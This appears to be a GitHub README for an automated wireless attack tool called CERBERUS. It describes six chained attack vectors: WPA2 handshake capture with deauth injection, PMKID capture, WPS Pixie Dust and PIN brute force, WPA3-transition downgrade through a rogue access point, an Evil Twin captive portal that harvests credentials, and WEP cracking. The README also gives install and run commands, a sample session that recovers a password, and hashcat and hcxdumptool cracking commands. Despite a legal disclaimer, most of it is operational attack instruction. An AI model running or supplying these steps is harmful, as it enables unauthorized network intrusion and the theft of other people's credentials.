CERBERUS is a multi-vector automated wireless security auditor — the hound that guards the gates of Hades, now unleashed on your wireless infrastructure. Six attack vectors, intelligent chaining, real-time animations, and GPU-accelerated cracking. One command. Everything it's got.




[06:42:39] * checking for wireless device . , .. , ...
[06:42:41] + found #3 devices
[06:43:08] $ SUCCESS! PASSWORD FOUND from wifi_rumah [Cont0hPassword123]
⚠️ LEGAL WARNING



┌─────────────────────────────────────────────────────────────────┐
│  THIS SOFTWARE IS FOR AUTHORIZED SECURITY TESTING ONLY          │
├─────────────────────────────────────────────────────────────────┤
│  • Use ONLY on networks you OWN or have WRITTEN authorization   │
│  • Unauthorized access is a federal crime in most countries     │
│  • The authors assume ZERO liability for misuse                 │
│  • If you don't have permission → DON'T RUN IT                  │
└─────────────────────────────────────────────────────────────────┘
🔥 WHAT CERBERUS CAN DO


Head #1 — Recon	Head #2 — Exploitation	Head #3 — Cracking
Network discovery	WPA2 4-way handshake capture	aircrack-ng (CPU)
Target profiling	PMKID clientless attack	hashcat (GPU, mode 22000)
Client enumeration	WPS Pixie Dust	Dictionary attack
WPS fingerprinting	WPA3-Transition downgrade	WPS PIN → PSK derivation
Encryption detection	Evil Twin captive portal	WEP KoreK
Channel hopping	Deauth injection	Multi-wordlist fallback
⚔️ ATTACK VECTORS
🎯 Vector 1: WPA2 4-Way Handshake Capture



[airodump-ng] ──→ [deauth injection] ──→ [handshake captured] ──→ [aircrack/hashcat]
Hops to target channel, listens for EAPOL. If handshake doesn't appear naturally, injects deauth packets to force client reconnection. 3 attempts with adaptive timing.

Cracking: aircrack-ng (CPU) OR hashcat mode 22000 (GPU — 10x faster).

🎯 Vector 2: PMKID Clientless Attack



[hcxdumptool] ──→ [PMKID captured] ──→ [hcxpcapngtool] ──→ [hashcat -m 22000]
No clients required. No deauth injection. Captures RSN PMKID from AP beacon alone. The stealth vector.

🎯 Vector 3: WPS Pixie Dust + PIN Brute Force



[reaver -K 1] ──→ [PIN recovered in minutes] ──→ [wpa_passphrase] ──→ [PSK]
Exploits weak RNG in WPS registrar implementations. If Pixie Dust fails, bully takes over with adaptive-timing online brute force.

PIN → Password: The recovered PIN is fed through wpa_passphrase to derive the WPA2 PSK directly.

🎯 Vector 4: WPA3-Transition Mode Downgrade



[WPA3-Transition detected] ──→ [rogue WPA2 AP] ──→ [client falls back] ──→ [handshake captured]
Detects WPA3-Transition mode (SAE + PSK). Broadcasts a WPA2-only access point with the same SSID. Clients automatically downgrade. Handshake captured. Game over.

Requirement: Target must broadcast both WPA3 and WPA2 — WPA3-only networks are immune.

🎯 Vector 5: Evil Twin + Captive Portal



[rogue AP] + [DNS spoof] + [HTTPS redirect] + [credential form] → [password captured]
Clones the target SSID with _Free suffix. Serves a credential-harvesting portal. All HTTP traffic redirected to localhost. Every credential logged to captured_credentials.txt.

The social engineering vector. Enabled with --evil-twin.

🎯 Vector 6: WEP IV Fragmentation



[aireplay-5] ──→ [PRGA keystream] ──→ [ARP injection] ──→ [IV flood] ──→ [aircrack -K]
For legacy networks. Fragmentation attack generates XOR keystream, ARP replay floods IVs, KoreK attack cracks instantly.

🧠 INTELLIGENT ATTACK CHAINING



[SCAN COMPLETE]
      │
      ├── WPA3 ──→ [Transition?]
      │              ├── Yes ──→ [WPA3 Downgrade] → [WPS] → [Evil Twin]
      │              └── No  ──→ [WPS] → [Evil Twin]
      │
      ├── WPA2 ──→ [WPS?]
      │              ├── Yes ──→ [Pixie Dust] → [PMKID] → [Handshake] → [Evil Twin]
      │              └── No  ──→ [PMKID] → [Handshake] → [Evil Twin]
      │
      ├── WPA ──→ (same as WPA2)
      │
      ├── WEP ──→ [Fragmentation] → [ARP Replay] → [aircrack -K]
      │
      └── Open ──→ "No password required"

      Each vector exits on success.
      No redundant operations.
      Minimal time waste.
📦 REQUIREMENTS
Hardware
Wireless adapter with monitor mode + packet injection
Recommended: Alfa AWUS036ACH, AWUS036ACS, TP-Link TL-WN722N v1
Chipset: RTL8812AU, RTL8188EU, Atheros AR9271, MediaTek MT7610U
Software (Kali Linux / Parrot OS)
bash



sudo apt update
sudo apt install -y aircrack-ng hostapd dnsmasq reaver bully hashcat \
                    hcxdumptool hcxpcapngtool tshark iw macchanger iptables
Python
Python 3.7+ (standard library only — zero pip dependencies)
🚀 INSTALLATION
bash



# Download
git clone https://github.com/your-username/cerberus.git
cd cerberus
chmod +x cerberus.py

# Or single-file
wget https://raw.githubusercontent.com/your-username/cerberus/main/cerberus.py
chmod +x cerberus.py

# Run
sudo python3 cerberus.py
🕹️ USAGE
bash



sudo python3 cerberus.py [options]
All operations require root for raw sockets, monitor mode, and packet injection.

Options


Flag	Default	Description
-i, --interface	auto-detect	Specify wireless interface (e.g., -i wlan1)
-w, --wordlist	/usr/share/wordlists/rockyou.txt	Path to dictionary file
--scan-time	20	Scan duration (seconds)
--handshake-timeout	120	Handshake capture window (seconds)
--wps-timeout	300	WPS attack window (seconds)
--evil-twin	off	Enable Evil Twin captive portal
--stealth	off	Randomize MAC address before scanning
Examples
bash



# Quick scan + attack (auto-detect everything)
sudo python3 cerberus.py

# Stealth mode + custom wordlist
sudo python3 cerberus.py --stealth -w /opt/wordlists/rockyou.txt -i wlan1

# Maximum aggression: long scan + WPS + Evil Twin
sudo python3 cerberus.py --scan-time 60 --wps-timeout 600 --evil-twin

# Quiet run (no Evil Twin, just passive vectors)
sudo python3 cerberus.py --stealth --handshake-timeout 300

REAL-TIME SESSION EXAMPLE
──────────────────────────────────────────────────────────────────────
  Session : 2026-07-06 06:42:39
──────────────────────────────────────────────────────────────────────

[06:42:39] * checking for wireless device . , .. , ...
[06:42:41] + found #3 devices : wlan0, wlan1, wlp2s0
[06:42:44] * enabling monitor mode on wlan0 . , ..
[06:42:46] + monitor interface ready : wlan0mon

══════════════════════════════════════════════════════════════════════
  :: STEP 1 — NETWORK DISCOVERY ::
══════════════════════════════════════════════════════════════════════

[06:42:46] * scanning all channels (20s, Ctrl+C to extend) ...
[06:43:06] + found #12 targets!

  #   PRIVACY                  BSSID            CH   PWR  ESSID / WPS
  ────────────────────────────────────────────────────────────────────
  1     WPA2 CCMP PSK      AA:BB:CC:DD:EE:01   CH 6   PWR -45   wifi_rumah
  2     WPA3 SAE PSK       BB:CC:DD:EE:FF:02   CH 1   PWR -62   secure_net    [WPS]
  3     WPA2 CCMP PSK      CC:DD:EE:FF:AA:03   CH11   PWR -55   wifi_kantor
  ...

  CERBERUS> please select the target : 1
[06:43:08] $ locked target : wifi_rumah (AA:BB:CC:DD:EE:01) — WPA2 CCMP PSK

══════════════════════════════════════════════════════════════════════
  :: STEP 2 — ATTACK SURFACE : wifi_rumah (WPA2 CCMP PSK) ::
══════════════════════════════════════════════════════════════════════

══════════════════════════════════════════════════════════════════════
  :: STEP 3 — WPA/WPA2 ATTACK VECTORS ::
══════════════════════════════════════════════════════════════════════

[06:43:08] > deploying multi-vector attack against wifi_rumah

[06:43:08] > launching PMKID clientless attack (no deauth required)
[06:43:23] * hcxdumptool gathering PMKID frames .............
[06:43:38] ! no PMKID obtained from target

[06:43:38] > initializing WPA2 4-way handshake capture
[06:43:40] * hopping to target channel 6 ..
[06:43:41] * listening for handshake (120s window) .......
[06:43:46] > forcing client re-association (deauth injection)
[06:43:49] * deauth round 1/3 ...
[06:43:53] * checking for handshake ...
[06:43:54] $ WPA2 4-way handshake captured!
[06:43:54] * cracking with aircrack-ng + rockyou.txt .....
[06:53:54] $ KEY FOUND! [ Cont0hPassword123 ]

══════════════════════════════════════════════════════════════════════
  :: STEP 4 — RESULT ::
══════════════════════════════════════════════════════════════════════

[06:53:54] $ SUCCESS! PASSWORD FOUND from wifi_rumah [Cont0hPassword123]
[06:53:54] * restoring adapter state ...
[06:53:56] $ closing! (authorized wireless audit completed)

OUTPUT STRUCTURE

cerberus_capture/
├── scan-01.csv                          # Raw scan data
├── AA_BB_CC_DD_EE_01/                   # Per-target folder
│   ├── wpa2_capture-01.cap              # The handshake
│   ├── pmkid.hc22000                    # PMKID for hashcat
│   ├── wps_pixie.txt                    # Reaver results
│   ├── bully.txt                        # Bully results
│   ├── hostapd_downgrade.conf           # WPA3 downgrade config
│   ├── evil_twin_hostapd.conf           # Evil Twin config
│   ├── portal/index.html                # Captive portal page
│   ├── captured_credentials.txt         # Stolen creds
│   ├── hashcat.out                      # Cracked passwords
│   └── proc_0.log                       # Process logs

TROUBLESHOOTING



┌──────────────────────────────────────────────────────────────────┐
│  PROBLEM                        SOLUTION                         │
├──────────────────────────────────────────────────────────────────┤
│  "no wireless interface found"   sudo airmon-ng / lsusb /        │
│                                    sudo apt install <driver>     │
│                                                                  │
│  "monitor mode failed"         sudo systemctl stop NetworkManager│
│                                    sudo airmon-ng start wlan0    │
│                                                                  │
│  "no wordlist available"         sudo apt install wordlist       │
│                                    wget rockyou.txt              │
│                                                                  │
│  "permission denied"             sudo python3 cerberus.py        │
│                                                                  │
│  processes left behind           sudo pkill -f airodump-ng       │
│                                    sudo pkill -f hostapd         │
│                                    sudo pkill -f dnsmasq         │
└──────────────────────────────────────────────────────────────────┘
🔧 ARCHITECTURE



CERBERUS
├── WirelessInterface          # Hardware abstraction
│   ├── detect()               # 5-method fallback detection
│   ├── enable_monitor()       # airmon-ng + validation
│   └── randomize_mac()        # macchanger stealth
│
├── Scanner                    # Network discovery
│   ├── scan()                 # airodump-ng wrapper
│   └── _parse_csv()           # CSV parser (4 fallback patterns)
│
├── AttackEngine               # All six vectors
│   ├── wpa2_handshake()       # airodump + deauth + crack
│   ├── pmkid_attack()         # hcxdumptool + hashcat
│   ├── wps_attack()           # reaver → bully fallback
│   ├── wpa3_downgrade()       # hostapd rogue AP
│   ├── evil_twin()            # captive portal
│   └── _hashcat_attack()      # GPU cracking wrapper
│
├── Cerberus (Orchestrator)    # Flow control
│   ├── run()                  # Main sequence
│   ├── _attack_wpa2/3/wep()   # Vector selection
│   └── _conclude()            # Result display
│
└── Animated UI engine
    ├── animated_wait()        # Dot-sequence animation (. → .. → ...)
    ├── status()               # Message with timestamp + icon
    └── header()               # Section separator

     BENCHMARKS
Vector	Avg Time	Success Rate	Notes

WPS Pixie Dust	2-15 min	~60% (vulnerable routers)	Depends on chipset RNG

PMKID	15-30 sec	~30%	Only APs that include PMKID in beacon

Handshake	30 sec - 5 min	~90% (with clients)	Requires at least 1 connected client

WPA3 Downgrade	60-120 sec	~70% (Transition mode)	Only Transition, not SAE-only

Evil Twin	1-60+ min	~85%	Depends on user gullibility

WEP	1-5 min	~95%	Only applicable to WEP networks

ADVANCED TIPS
Custom hashcat rules
bash


# Generate hashcat rules file
echo '$1 $! $@ $# $F $a $k $e $W $o $r $d' > /tmp/custom.rule

# Run hashcat manually with rules
hashcat -m 22000 handshake.hc22000 \
        -r /usr/share/hashcat/rules/best64.rule \
        -r /tmp/custom.rule \
        rockyou.txt --force
Parallel cracking (multi-GPU)
bash



# Split wordlist and run on each GPU
hashcat -m 22000 -d 1 handshake.hc22000 wordlist_part1.txt --force
hashcat -m 22000 -d 2 handshake.hc22000 wordlist_part2.txt --force
Manual PMKID extraction
bash



# Using hcxdumptool standalone
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
sudo hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt --force
Manual Evil Twin + better captive portal
bash



# Use PiXPL or wifi-phisher for a more polished portal
sudo airgeddon  # Alternative with better Evil Twin

CONNECT



┌─────────────────────────────────────────────────────────────────┐
│  Questions? Issues? Pull Requests?                              │
│                                                                 │
│  ⭐ Star this repo if you find it useful                        │
│  🐛 Report bugs via GitHub Issues                               │
│  🔀 Fork and contribute — all PRs welcome                       │
└─────────────────────────────────────────────────────────────────┘
